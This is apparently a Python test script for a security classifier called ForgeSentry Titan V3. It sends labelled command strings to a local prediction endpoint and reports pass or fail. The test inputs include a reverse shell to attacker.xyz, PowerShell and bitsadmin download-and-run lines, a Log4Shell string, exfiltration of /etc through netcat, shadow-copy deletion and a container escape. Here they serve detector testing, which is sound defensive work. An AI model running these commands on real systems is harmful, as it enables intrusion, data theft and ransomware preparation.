import requests
import json

def test_titan_v3_az():
    url = "http://127.0.0.1:8000/predict"
    
    print("\n[FORGESENTRY TITAN V3] GLOBAL A-Z THREAT VERIFICATION...")
    print("=" * 120)
    
    # These are highly complex, obfuscated, and specialized A-Z attacks.
    tests = [
        {"input": "git commit -m 'Initial UI'", "expected": "Normal_Business_Ops"},
        {"input": "kubectl get secrets --all-namespaces -o json", "expected": "Cloud_&_Container_Exploit"},
        {"input": "bitsadmin /transfer myJob http://bad.com/stage2.exe C:\\temp\\p.exe", "expected": "Advanced_Persistence_&_LotL"},
        {"input": "sh -i >& /dev/tcp/attacker.xyz/443 0>&1", "expected": "Advanced_RCE_&_C2"},
        {"input": "s7_comm_stop_cpu_all", "expected": "Critical_Infrastructure_ICS"},
        {"input": "${jndi:rmi://attacker.cloud/a}", "expected": "Supply_Chain_&_Log4Shell"},
        {"input": "wmic shadowcopy delete", "expected": "Ransomware_Prep"},
        {"input": "tar -czvf - /etc/ | nc attacker.host 9999", "expected": "Ransomware_Prep"},
        {"input": "docker run -it --rm -v /:/host/ root/ubuntu chroot /host/", "expected": "Cloud_&_Container_Exploit"},
        {"input": "powershell -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://bad.io')\"", "expected": "Advanced_Persistence_&_LotL"}
    ]

    print(f"{'Global A-Z Attack Vector':<60} | {'MITRE TTP Mapping':<35} | {'Risk':<5} | {'Result'}")
    print("-" * 120)

    for test in tests:
        try:
            response = requests.post(url, json=test)
            result = response.json()
            prediction = result.get('label', 'Error')
            mitre = result.get('mitre_id', 'N/A')
            risk = result.get('risk_score', 0)
            
            # Substring matching for expected result because labels are long
            status = "PASS" if prediction == test['expected'] else f"FAIL ({prediction})"
            print(f"{test['input'][:58]:<60} | {mitre[:33]:<35} | {risk:<5} | {status}")
        except Exception as e:
            print(f"{test['input'][:58]:<60} | ERROR: {str(e)}")

    print("=" * 120)

if __name__ == "__main__":
    test_titan_v3_az()
